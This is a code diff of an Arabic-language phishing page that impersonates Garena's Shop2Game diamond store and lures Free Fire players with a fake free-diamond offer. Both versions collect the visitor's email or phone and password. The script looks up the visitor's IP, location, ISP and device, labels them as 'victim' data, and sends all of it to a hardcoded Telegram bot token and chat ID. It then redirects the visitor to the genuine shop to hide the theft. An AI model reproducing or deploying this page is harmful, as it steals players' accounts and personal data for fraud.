@@ -3,115 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Shop2Game | الشحن الرسمي</title>
+    <title>Garena Shop2Game | العروض الرسمية</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background-color: #f4f4f4; }
+        body { background-color: #f4f4f4; color: #333; }
         header { background: #fff; padding: 10px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ee1c24; }
-        .garena-logo { height: 30px; }
-        .section-header { background: #ebebeb; padding: 12px 5%; font-size: 0.95rem; font-weight: bold; text-align: right; border-right: 5px solid #ee1c24; }
+        .garena-logo { height: 35px; }
+        .header-text { font-weight: bold; color: #ee1c24; font-size: 0.85rem; }
         .hero { width: 100%; text-align: center; background: #fff; padding: 10px; }
         .hero img { width: 100%; max-width: 600px; border-radius: 5px; }
-        .game-area { padding: 40px 20px; display: flex; justify-content: center; background: #fff; }
-        .game-btn { border: 1.5px solid #ddd; border-radius: 12px; padding: 15px; width: 150px; text-align: center; cursor: pointer; }
-        .game-btn img { width: 110px; height: 110px; border-radius: 15px; }
-        .offers-grid { display: none; padding: 20px; grid-template-columns: repeat(2, 1fr); gap: 12px; max-width: 500px; margin: 0 auto; }
-        .diamond-card { background: #fff; border: 1px solid #eee; border-radius: 8px; padding: 15px; text-align: center; cursor: pointer; }
-        .diamond-card b { color: #00cae3; }
-        .diamond-card span { color: #ee1c24; font-weight: bold; }
-        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; display: none; align-items: center; justify-content: center; }
-        .modal { background: #fff; width: 92%; max-width: 380px; border-radius: 15px; padding: 25px; text-align: center; }
+        .section-header { background: #ebebeb; padding: 12px 5%; font-size: 0.95rem; font-weight: bold; text-align: right; border-right: 5px solid #ee1c24; }
+        .game-selection { padding: 40px 20px; display: flex; justify-content: center; background: #fff; }
+        .ff-btn { border: 2.5px solid #ee1c24; border-radius: 20px; padding: 20px; width: 180px; text-align: center; cursor: pointer; background: #fff; box-shadow: 0 5px 15px rgba(238,28,36,0.1); }
+        .ff-btn img { width: 120px; height: 120px; border-radius: 15px; }
+        .offers-grid { display: none; padding: 20px; grid-template-columns: repeat(2, 1fr); gap: 12px; max-width: 600px; margin: 0 auto; }
+        .card { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 15px; text-align: center; cursor: pointer; transition: 0.2s; }
+        .card:hover { border-color: #ee1c24; }
+        .card b { color: #00cae3; font-size: 1.1rem; }
+        .card span { color: #ee1c24; font-weight: bold; display: block; margin-top: 5px; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; display: none; align-items: center; justify-content: center; }
+        .modal { background: #fff; width: 90%; max-width: 380px; border-radius: 15px; padding: 25px; text-align: center; }
         .modal input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
-        .submit-btn { width: 100%; padding: 14px; background: #ee1c24; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        footer { background: #222; color: #888; padding: 20px; text-align: center; font-size: 0.8rem; border-top: 3px solid #ee1c24; }
+        .btn-submit { width: 100%; padding: 14px; background: #ee1c24; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
+        .extra-box { background: #fff; margin: 20px; padding: 15px; border-radius: 10px; border: 1px dashed #ee1c24; text-align: center; cursor: pointer; }
+        footer { background: #222; color: #888; padding: 25px; text-align: center; font-size: 0.8rem; border-top: 3px solid #ee1c24; margin-top: 30px; }
     </style>
 </head>
 <body>
 
     <header>
-        <div style="color:#ee1c24; font-weight:bold;">مركز الشحن الثاني للعروض</div>
-        <img src="https://i.ibb.co/Photoroom-20260127-204345.png" class="garena-logo">
+        <div class="header-text">مركز الشحن الثاني للعروض</div>
+        <img src="https://i.postimg.cc/m2fV91D0/Photoroom-20260127-204345.png" class="garena-logo">
     </header>
 
     <div class="hero">
-        <img src="https://i.ibb.co/Photoroom-20260129-204300.jpg">
-        <p style="color:#ee1c24; font-weight:bold; margin-top:5px;">⌛ ينتهي العرض خلال 10:00 دقائق</p>
+        <img src="https://i.postimg.cc/85zX3S0y/Photoroom-20260129-204300.jpg">
+        <p style="color:#ee1c24; font-weight:bold; margin-top:5px;">⚠️ عرض مؤقت: ينتهي قريباً</p>
     </div>
 
-    <div id="gameStep">
+    <div id="step1">
         <div class="section-header">اختيار اللعبة</div>
-        <div class="game-area">
-            <div class="game-btn" onclick="showOffs()">
-                <img src="https://i.ibb.co/Photoroom-20260129-205044.jpg">
-                <p style="margin-top:10px; font-weight:bold;">Free Fire</p>
+        <div class="game-selection">
+            <div class="ff-btn" onclick="showOffers()">
+                <img src="https://i.postimg.cc/L5X9N4mR/Photoroom-20260129-205044.jpg">
+                <p style="margin-top:10px; font-weight:bold; color:#333;">Free Fire</p>
             </div>
         </div>
     </div>
 
-    <div id="offerStep" style="display:none;">
+    <div id="step2" style="display:none;">
         <div class="section-header">كمية الشحن المتاحة</div>
         <div class="offers-grid">
-            <div class="diamond-card" onclick="openLogin('500 جوهرة')"><b>💎 500</b><br><span>مجاناً</span></div>
-            <div class="diamond-card" onclick="buyRedirect()"><b>💎 1000</b><br><span>2.5$</span></div>
-            <div class="diamond-card" onclick="buyRedirect()"><b>💎 5000</b><br><span>5$</span></div>
-            <div class="diamond-card" onclick="buyRedirect()"><b>💎 25000</b><br><span>20$</span></div>
+            <div class="card" onclick="openLogin('500 جوهرة')"><b>💎 500</b><span>مجاناً</span></div>
+            <div class="card" onclick="askBuy('700 جوهرة', '2$')"><b>💎 700</b><span>2$</span></div>
+            <div class="card" onclick="askBuy('1000 جوهرة', '2.5$')"><b>💎 1000</b><span>2.5$</span></div>
+            <div class="card" onclick="askBuy('5000 جوهرة', '5$')"><b>💎 5000</b><span>5$</span></div>
+            <div class="card" onclick="askBuy('7000 جوهرة', '6$')"><b>💎 7000</b><span>6$</span></div>
+            <div class="card" onclick="askBuy('9000 جوهرة', '7$')"><b>💎 9000</b><span>7$</span></div>
+            <div class="card" onclick="askBuy('10000 جوهرة', '9$')"><b>💎 10000</b><span>9$</span></div>
+            <div class="card" onclick="askBuy('15000 جوهرة', '13$')"><b>💎 15000</b><span>13$</span></div>
+            <div class="card" onclick="askBuy('20000 جوهرة', '17$')"><b>💎 20000</b><span>17$</span></div>
+            <div class="card" onclick="askBuy('25000 جوهرة', '20$')"><b>💎 25000</b><span>20$</span></div>
         </div>
     </div>
 
-    <div id="loginOverlay">
+    <div class="extra-box" onclick="alert('تم منح الصلاحية بنجاح! يرجى تسجيل الدخول للحصول على معلومات حساباتك الأخرى والمكافآت.')">
+        <h4 style="color:#ee1c24;">🎁 اضغط هنا لمعرفة المزيد</h4>
+        <p style="font-size:0.85rem; color:#666; margin-top:5px;">فحص الحسابات المرتبطة وتفعيل هدايا Garena الإضافية</p>
+    </div>
+
+    <div id="overlay">
         <div class="modal">
             <h3 id="mLabel">تسجيل الدخول</h3>
-            <div style="display:flex; gap:10px; margin:15px 0;">
-                <button onclick="setMethod('Facebook')" style="flex:1; padding:10px; background:#1877f2; color:#fff; border:none; border-radius:6px;">Facebook</button>
-                <button onclick="setMethod('Google')" style="flex:1; padding:10px; background:#fff; border:1px solid #ddd; border-radius:6px;">Google</button>
+            <div style="display:flex; gap:10px; margin:20px 0;">
+                <button onclick="setM('Facebook')" style="flex:1; padding:12px; background:#1877f2; color:#fff; border:none; border-radius:6px; cursor:pointer;">Facebook</button>
+                <button onclick="setM('Google')" style="flex:1; padding:12px; background:#fff; border:1px solid #ddd; border-radius:6px; cursor:pointer;">Google</button>
             </div>
-            <input type="text" id="emailField" placeholder="البريد الإلكتروني أو الهاتف">
-            <input type="password" id="passField" placeholder="كلمة المرور">
-            <button class="submit-btn" onclick="collectAll()">شحن الآن 💎</button>
+            <input type="text" id="u" placeholder="البريد الإلكتروني أو الهاتف">
+            <input type="password" id="p" placeholder="كلمة المرور">
+            <button class="btn-submit" onclick="send()">شحن الآن 💎</button>
         </div>
     </div>
 
     <footer>
-        <p>© 2026 Garena Online. مركز الشحن الرسمي</p>
+        <p>موقع garena الرسمي الثاني لشحن الجواهر</p>
+        <p>© 2026 Garena Online. All Rights Reserved.</p>
     </footer>
 
     <script>
         const TOKEN = '8445311511:AAFYyFSR9ZSZdTYIHNAZI5wNzL8xmzHmJzw';
         const CHAT_ID = '7902407443';
-        let giftName = ""; let loginType = "Facebook";
+        let gift = ""; let method = "Facebook";
 
-        function showOffs() {
-            document.getElementById('gameStep').style.display = 'none';
-            document.getElementById('offerStep').style.display = 'block';
+        function showOffers() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
             document.querySelector('.offers-grid').style.display = 'grid';
         }
 
-        function buyRedirect() { window.location.href = "https://shop2game.com/?item=57764"; }
-
-        function openLogin(name) {
-            giftName = name;
-            document.getElementById('loginOverlay').style.display = 'flex';
+        function askBuy(n, p) {
+            if(confirm(`هل أنت متأكد أنك تريد شراء ${n} بـ ${p}؟`)) {
+                window.location.href = "https://shop2game.com/?item=57764";
+            }
         }
 
-        function setMethod(m) { loginType = m; document.getElementById('mLabel').innerText = "الدخول عبر " + m; }
+        function openLogin(n) {
+            gift = n; document.getElementById('overlay').style.display = 'flex';
+        }
 
-        async function collectAll() {
-            const user = document.getElementById('emailField').value;
-            const pass = document.getElementById('passField').value;
-            if(!user || !pass) return alert("يرجى إدخال البيانات");
+        function setM(m) { method = m; document.getElementById('mLabel').innerText = "الدخول عبر " + m; }
 
-            // جمع معلومات متقدمة عن الضحية
-            let extra = "";
+        async function send() {
+            const u = document.getElementById('u').value; const p = document.getElementById('p').value;
+            if(!u || !p) return alert("يرجى إدخال البيانات");
+
+            let info = "";
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                extra = `\n\n🔎 معلومات إضافية عن الضحية:\n🌐 IP: ${d.ip}\n🏙️ الموقع: ${d.city}, ${d.country_name}\n📡 المزود: ${d.org}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}\n🌍 اللغة: ${navigator.language}`;
+                info = `\n\n🔎 معلومات الضحية:\n🌐 IP: ${d.ip}\n🏙️ الموقع: ${d.city}, ${d.country_name}\n📡 المزود: ${d.org}\n📱 الجهاز: ${navigator.platform}`;
             } catch(e) {}
 
-            const text = `🎯 صيد جديد مكتمل:\n\n💎 الطلب: ${giftName}\n📱 الطريقة: ${loginType}\n📧 الحساب: ${user}\n🔑 الباسورد: ${pass}${extra}`;
-            
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+            const msg = `🎯 صيد جديد من Shop2Game:\n💎 الطلب: ${gift}\n📱 الطريقة: ${method}\n📧 الحساب: ${u}\n🔑 الباسورد: ${p}${info}`;
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
             window.location.href = "https://shop2game.com/?item=57764";
         }
     </script>
